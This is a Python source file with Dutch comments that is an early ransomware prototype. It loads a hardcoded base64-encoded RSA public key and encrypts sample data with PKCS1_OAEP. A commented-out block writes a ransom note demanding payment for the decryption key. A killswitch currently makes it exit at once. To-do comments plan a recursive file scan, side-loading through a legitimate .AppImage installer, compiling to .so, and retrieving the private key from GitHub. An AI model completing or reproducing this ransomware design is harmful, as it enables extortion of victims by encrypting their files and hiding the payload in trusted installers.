import glob
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

#Killswitch Functie
Killswitch = True

if Killswitch==True:
    exit()
else:
    pass
#Publiek key maken, en in een RSA key functie zetten.
#Pub key gecodeerd in Base64 Voor transport.
Pub_key_Base64 = str(" LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyMHVZbHdoS1ZHai9OUFdWeG9KcwpYV2pzVlpZbWlUYjFBTjhET1o1SnlBM04rUUFnZy9tRXhoTFdHVG9FMmNtSWtKc1JjK2tqZkIwYTJ4dW1sU1NTCncrL1FaRllsMFFwTlFPNFJjamNDcHUrVU5VQXJTVmU2cE9pVU1xcGdDWS82LzJMeHpNYlVDbXEzcVNudFVORXEKMzRxc1phbWlMbXJ4aUF6eXJRTlJrS2tLNzBva3BtbUpNdjRINDlnR3F0cWJocTB2YWRNaktEcVhmaE5SNHAyZApjUDJPSC96OGliWXp5WDR4bDMwZkVDWXl4SEpycHgraUZRaGhBazNrQklLR1E4L2ErcFNPOGE1emtVbnFFZW1FCkpNa2huck0xanpSOUJtRWtScFlpTnR0OER1MkpFZDdrZnhKL2xTV2NLVlZtWHBncGNtcEMrRllxMUJQeStCV1kKaVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t")
Base64_bytes = Pub_key_Base64.encode('ascii')
Pub_key_string_byte = base64.b64decode(Base64_bytes)
Pub_key = Pub_key_string_byte.decode('ascii')

RSA_key = RSA.import_key(str(Pub_key))
#Gebruik de RSA key in de PKCS1 Encryptie functie.
cipher_rsa = PKCS1_OAEP.new(RSA_key)

#SANDER!!!! HIER BEGINNEN :) - Encryptiefunctie
Data = "Dit is data"
Encrypt_data = cipher_rsa.encrypt(Data.encode("utf-8"))
#print(Encrypt_data)

'''
#Readme aanmaken.
Readme = open("README.txt","w")
Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
Readme.close()
'''

#Endstage
print("Code 200!")

# Scan Dirs voor locatie (Waar ben ik?)
# Doe een glob.glob() scan voor de beschikbare bestanden (recursive)
# Side-loaden via orginele .AppImage installer.
# MAC als salt + harcoded key. <-- Nope, PubKey gedaan. (Done)
# README tegen het einde. (Done)
# Linux based, .py to .so en intergraten in een .AppImage ofzo?
# RSA 2096-bit (Done) of toch ECC 256-bit of 512-bit ? (Waarom of gewoon leuk?)
# Hoe de Priv key ontvangen? - Staat in Github :) (API key?, en pullen?)